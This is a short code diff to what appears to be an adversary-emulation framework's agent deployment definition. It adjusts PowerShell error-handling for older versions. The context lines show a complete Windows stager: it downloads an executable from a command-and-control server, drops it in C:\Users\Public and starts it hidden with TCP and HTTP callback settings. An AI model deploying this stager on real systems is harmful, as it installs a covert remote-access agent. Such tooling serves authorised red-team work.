@@ -45,6 +45,7 @@
     windows:
       psh:
         command: |
+          if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
           $server="#{app.contact.http}";
           $socket="#{app.contact.tcp}";
           $contact="tcp";
@@ -54,7 +55,7 @@
           $wc.Headers.add("file","manx.go");
           $data=$wc.DownloadData($url);
           $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-          Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea ignore;
-          rm -force "C:\Users\Public\$name.exe" -ea ignore;
+          Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
+          rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
           ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
           Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden;
